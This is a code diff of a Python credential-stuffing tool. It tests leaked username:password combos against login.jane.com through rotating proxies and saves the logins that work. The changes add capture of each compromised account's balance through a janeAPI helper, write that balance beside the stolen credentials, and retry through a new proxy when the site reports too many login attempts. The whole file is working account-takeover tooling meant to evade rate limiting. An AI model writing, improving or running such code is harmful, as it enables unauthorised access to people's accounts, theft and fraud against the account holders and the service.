@@ -2,12 +2,13 @@ import requests
 import json
 import uuid
 import random
+import janeAPI
 from multiprocessing import Pool # Multi-Threading
 from multiprocessing import freeze_support # Windows Support
 
 requests.packages.urllib3.disable_warnings()
 
-accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
+accounts = [line.rstrip('\n') for line in open("working.txt", 'r')]
 proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]
 
 LOGIN_ENDPOINT="https://login.jane.com/login"
@@ -69,13 +70,17 @@ def checkAccount(account):
             responseJson = response.json()
             janeAuth = responseJson['janeAuth']
             print(f'[Good Account] {account} - {janeAuth}')
+            capture = janeAPI.getBalance(janeAuth, deviceId, sessionId, proxyUrl)
             with open('working.txt', 'a') as f:
-                f.write(account + "\n")
+                f.write(f"{account} | {capture}\n")
                 f.close()
+        elif('too many login attempts' in response.text):
+            checkAccount(account)
+            raise Exception('Banned Proxy')
         else:
-            print(f'[Bad Account] {account}')
+            print(f'[Bad Account] {account} - {response.text}')
     except Exception as e:
-        print(f'[Checking Failed ({e}) {account}]')
+        print(f'[Bad Proxy ({e})] + {proxy}')
         proxies.remove(proxy)
 
 def main():
